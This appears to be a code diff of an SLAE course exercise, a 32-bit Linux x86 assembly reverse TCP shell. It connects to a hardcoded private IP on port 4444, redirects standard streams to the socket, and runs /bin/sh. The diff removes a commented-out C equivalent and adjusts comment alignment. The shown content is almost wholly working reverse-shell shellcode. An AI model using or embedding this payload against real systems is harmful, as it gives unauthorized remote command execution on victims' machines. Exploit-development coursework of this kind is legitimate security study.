@@ -4,27 +4,6 @@
 ; For SecurityTube Linux Assembly Expert course.
 ; SLAE-877
 
-;int main() {
-;  int s;
-;  struct sockaddr_in c;
-;
-;
-;  c.sin_family = AF_INET;
-;  c.sin_port = htons (4444);
-;  c.sin_addr.s_addr = inet_addr ("127.0.0.1");
-;
-;  s = socket (AF_INET, SOCK_STREAM, IPPROTO_IP);
-;
-;  connect (s, (struct sockaddr *)&c, sizeof (c));
-;
-;  dup2 (s, STDERR_FILENO);
-;  dup2 (s, STDOUT_FILENO);
-;  dup2 (s, STDIN_FILENO);
-;
-;  execve ("/bin/sh", NULL, NULL);
-;}
-
-
 BITS 32
 
 
@@ -33,7 +12,6 @@ PORT equ 0x5c11
 
 ; python -c 'import socket,struct; print hex(struct.unpack("<L", socket.inet_aton("192.168.10.126"))[0])'
 HOST equ 0x7e0aa8c0
- 
 
 xor eax, eax              ; zero out eax
 xor ebx, ebx              ; zero out ebx
@@ -64,25 +42,25 @@ mov ecx, esp              ; save address
 int 0x80                  ; call connect()
 
 ;; dup2 loop
-xor ecx, ecx                   ; zero out ecx
-mov cl, 2                      ; initialize counter
+xor ecx, ecx              ; zero out ecx
+mov cl, 2                 ; initialize counter
 loop:
     xor eax, eax
-    add eax, 63                ; dup2()
+    add eax, 63           ; dup2()
     int 0x80
-    dec ecx                    ; decrease counter
-    jns loop                   ; jump to loop if applicable
+    dec ecx               ; decrease counter
+    jns loop              ; jump to loop if applicable
 
-xor eax, eax                   ; zero out eax
-push eax                       ; push null byte
-push 0x68732f2f                ; //sh
-push 0x6e69622f                ; /bin
-mov ebx, esp                   ; copy address of string
-push eax                       ; null
-push ebx                       ; address of /bin/sh 
-mov ecx, esp                   ;
-push eax                       ; null
-mov edx, esp                   ; envp
-mov al, 11                     ; execve()
-int 0x80                       ; call execve()
+xor eax, eax              ; zero out eax
+push eax                  ; push null byte
+push 0x68732f2f           ; //sh
+push 0x6e69622f           ; /bin
+mov ebx, esp              ; copy address of string
+push eax                  ; null
+push ebx                  ; address of /bin/sh 
+mov ecx, esp              ;
+push eax                  ; null
+mov edx, esp              ; envp
+mov al, 11                ; execve()
+int 0x80                  ; call execve()
 
